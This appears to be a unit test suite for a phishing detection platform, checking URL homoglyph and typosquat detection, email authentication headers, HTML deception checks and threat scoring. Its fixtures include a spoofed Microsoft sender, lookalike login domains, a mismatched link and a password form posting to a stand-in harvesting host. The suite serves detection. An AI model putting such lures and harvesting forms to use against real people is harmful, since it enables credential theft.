"""Comprehensive test suite for Scam Detective Phishing Detection Platform."""
import unittest
from engine.features import (
    HeaderFeatureExtractor,
    UrlFeatureExtractor,
    NlpBodyExtractor,
    extract_all_features_from_email,
    calculate_shannon_entropy,
    levenshtein_distance,
)
from engine.scenarios import get_all_scenarios, get_scenario_by_id
from engine.ml_engine import PhishingScoringEngine
from engine.sandbox import SandboxAnalyzer


class TestPhishingDetection(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.scoring_engine = PhishingScoringEngine(model_dir="engine")

    def test_levenshtein_and_entropy(self):
        """Test edit distance and Shannon entropy algorithms."""
        self.assertEqual(levenshtein_distance("microsoft", "microsoft"), 0)
        self.assertEqual(levenshtein_distance("micr0soft", "microsoft"), 1)
        self.assertGreater(levenshtein_distance("defense", "google"), 4)

        entropy_low = calculate_shannon_entropy("aaaaaa")
        self.assertEqual(entropy_low, 0.0)
        entropy_high = calculate_shannon_entropy("x8q9z7w2m1k4v8p")
        self.assertGreater(entropy_high, 3.5)

    def test_homoglyph_detection(self):
        """Verify Cyrillic homoglyphs and Punycode are detected."""
        # 'о' is Cyrillic U+043E
        url_with_cyrillic = "https://login-micr\u043esoft365-verify.com"
        res = UrlFeatureExtractor.analyze_single_url(url_with_cyrillic)
        self.assertGreater(len(res["homoglyphs_detected"]), 0)
        self.assertGreaterEqual(res["risk_score"], 45.0)

        # Punycode URL
        puny_url = "https://xn--cmmc-d-81a.xyz/portal/verify"
        res_puny = UrlFeatureExtractor.analyze_single_url(puny_url)
        self.assertTrue(res_puny["is_punycode"])
        self.assertGreaterEqual(res_puny["risk_score"], 45.0)

    def test_brand_typosquatting(self):
        """Verify brand impersonation detection."""
        url = "https://login-microsoft-portal.xyz/oauth"
        res = UrlFeatureExtractor.analyze_single_url(url)
        self.assertEqual(res["typosquat_target"], "microsoft")
        self.assertTrue(res["is_high_risk_tld"])

    def test_header_analyzer(self):
        """Verify SPF/DKIM/DMARC and sender spoof detection."""
        eml = """From: "Microsoft 365 Security" <attacker@untrusted.xyz>
Return-Path: <bounce@untrusted.xyz>
Authentication-Results: mx.defense.com; spf=fail; dkim=fail; dmarc=fail
Subject: Password Expired
Content-Type: text/plain

Please verify your credentials.
"""
        extracted = extract_all_features_from_email(eml)
        headers = extracted["headers"]
        self.assertEqual(headers["spf"]["status"], "fail")
        self.assertEqual(headers["dkim"]["status"], "fail")
        self.assertEqual(headers["dmarc"]["status"], "fail")
        self.assertTrue(headers["mismatches"]["display_name_spoof"])
        self.assertGreater(headers["header_risk_score"], 60.0)

    def test_nlp_and_html_analyzer(self):
        """Verify urgency detection and deceptive HTML checks."""
        html = """<html>
        <body>
        <p>Your account will be suspended within 24 hours. Immediate action required.</p>
        <p>Verify your password now.</p>
        <a href="http://evil.xyz">https://login.microsoftonline.com</a>
        <span style="font-size:0px;">hidden text</span>
        <form action="http://malicious.com/harvest.php"><input name="pass"/></form>
        </body></html>"""
        
        dom_res = NlpBodyExtractor.analyze_html_dom(html)
        self.assertEqual(len(dom_res["anchor_mismatches"]), 1)
        self.assertEqual(dom_res["hidden_elements_count"], 1)
        self.assertEqual(len(dom_res["external_form_actions"]), 1)

        nlp_res = NlpBodyExtractor.analyze_text_nlp(html)
        self.assertGreater(nlp_res["counts"]["urgency"], 0)
        self.assertGreater(nlp_res["counts"]["fear"], 0)
        self.assertTrue(nlp_res["has_credential_solicitation"])

    def test_ml_scoring_critical_scenario(self):
        """Verify critical spear-phishing scenarios score >= 85% and benign scenarios score < 25%."""
        scenarios = get_all_scenarios()
        self.assertGreaterEqual(len(scenarios), 5)

        # 1. APT HR Policy Update (Critical)
        apt_scen = get_scenario_by_id("apt_hr_policy_update")
        extracted_apt = extract_all_features_from_email(apt_scen["raw_eml"])
        pred_apt = self.scoring_engine.predict_threat(extracted_apt)
        self.assertGreaterEqual(pred_apt["threat_score"], 80.0)
        self.assertIn(pred_apt["severity"], ["HIGH", "CRITICAL"])

        # 2. Legitimate All-Hands (Benign)
        legit_scen = get_scenario_by_id("legit_corporate_allhands")
        extracted_legit = extract_all_features_from_email(legit_scen["raw_eml"])
        pred_legit = self.scoring_engine.predict_threat(extracted_legit)
        self.assertLess(pred_legit["threat_score"], 25.0)
        self.assertEqual(pred_legit["severity"], "LOW")

    def test_sandbox_analyzer(self):
        """Verify safe sandbox preview generation."""
        preview = SandboxAnalyzer.generate_sandbox_preview("https://login-micrоsoft365-verify.com/login")
        self.assertFalse(preview["is_safe"])
        self.assertIn("passwd", preview["harvested_fields"])
        self.assertIn("Let's Encrypt", preview["ssl_issuer"])


if __name__ == "__main__":
    unittest.main()
